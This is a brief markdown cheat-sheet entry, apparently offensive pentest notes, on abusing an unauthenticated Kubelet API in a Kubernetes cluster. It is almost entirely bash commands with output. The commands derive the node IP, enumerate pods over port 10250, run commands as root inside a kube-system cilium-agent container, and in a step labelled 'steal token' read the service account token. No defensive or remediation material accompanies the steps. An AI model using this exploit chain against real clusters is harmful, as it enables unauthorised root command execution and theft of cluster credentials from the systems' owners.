# Misconfigs

## Direct unauth Kubelet API access

```bash
# determine current node IP
cat /proc/net/route
# Iface   Destination     Gateway         Flags   RefCnt  Use     Metric  Mask            MTU     Window  IRTT
# eth0    00000000        EF02F40A        0003    0       0       0       00000000        0       0       0 
# eth0    EF02F40A        00000000        0005    0       0       0       FFFFFFFF        0       0       0 

# off the node
echo 'Iface   Destination     Gateway         Flags   RefCnt  Use     Metric  Mask            MTU     Window  IRTT
eth0    00000000        EF02F40A        0003    0       0       0       00000000        0       0       0
eth0    EF02F40A        00000000        0005    0       0       0       FFFFFFFF        0       0       0
' | awk '$2=="00000000"{print $3; exit}' | { read H; printf "%d.%d.%d.%d\n" 0x${H:6:2} 0x${H:4:2} 0x${H:2:2} 0x${H:0:2}; }
# 10.244.2.239

# query if --anonymous-auth is on
curl -sk https://10.244.2.239:10250/pods
# {"kind":"PodList","apiVersion":"v1","metadata":{},"items":[{"metadata":{"name":"cilium-envoy-w2d.....

curl -skL https://10.244.2.239:10250/runningpods
# ...
# {
#   "metadata": {
#     "name": "cilium-nzhm6",
#     "namespace": "kube-system",
#     "uid": "92dd1d48-cc6d-4ede-8878-834bcab386f3"
#   },
#   "spec": {
#     "containers": [
#       {
#         "name": "cilium-agent",
#         "image": "sha256:d17ba2d17aae429d83ff8b699e75ce1f6a50ba0de791f2c685fb689176c5f69f",
#         "resources": {}
#       }
#     ]
#   },
#   "status": {}
# },
# ...

# execute a command on the remote container
curl -sk -G -X POST "https://10.244.2.239:10250/run/kube-system/cilium-nzhm6/cilium-agent" --data-urlencode "cmd=id"
# uid=0(root) gid=0(root) groups=0(root)

# steal token
curl -sk -G -X POST "https://10.244.2.239:10250/run/kube-system/cilium-nzhm6/cilium-agent" --data-urlencode "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
# eyJhbGciOiJSUzI1NiIsImtpZCI6InA5Y0xubmtjLVVuNmR...
```
